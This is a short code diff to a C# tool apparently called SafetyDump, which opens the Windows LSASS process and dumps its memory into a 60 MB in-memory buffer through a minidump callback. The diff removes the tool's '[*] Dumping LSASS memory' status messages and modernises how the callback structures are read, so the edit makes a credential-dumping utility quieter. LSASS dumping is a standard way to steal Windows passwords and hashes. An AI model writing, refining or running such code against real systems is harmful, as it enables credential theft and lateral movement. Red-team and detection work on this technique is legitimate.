@@ -34,7 +34,6 @@ namespace SafetyDump
             Process targetProcess = null;
             if (pid == -1)
             {
-                Console.WriteLine("[*] Dumping LSASS memory");
                 var processes = Process.GetProcessesByName("lsass");
                 targetProcess = processes[0];
             }
@@ -53,7 +52,6 @@ namespace SafetyDump
 
             try
             {
-                Console.WriteLine($"[*] Dumping {targetProcess.ProcessName} memory");
                 targetProcessId = (uint)targetProcess.Id;
                 targetProcessHandle = targetProcess.Handle;
             }
@@ -71,10 +69,8 @@ namespace SafetyDump
                 var byteArray = new byte[60 * 1024 * 1024];
                 var callbackPtr = new Internals.MinidumpCallbackRoutine((param, input, output) =>
                 {
-                    var inputStruct = new Internals.MINIDUMP_CALLBACK_INPUT();
-                    Marshal.PtrToStructure(input, inputStruct);
-                    var outputStruct = new Internals.MINIDUMP_CALLBACK_OUTPUT();
-                    Marshal.PtrToStructure(output, outputStruct);
+                    var inputStruct = Marshal.PtrToStructure<Internals.MINIDUMP_CALLBACK_INPUT>(input);
+                    var outputStruct = Marshal.PtrToStructure<Internals.MINIDUMP_CALLBACK_OUTPUT>(output);
                     switch (inputStruct.CallbackType)
                     {
                         case Internals.MINIDUMP_CALLBACK_TYPE.IoStartCallback:
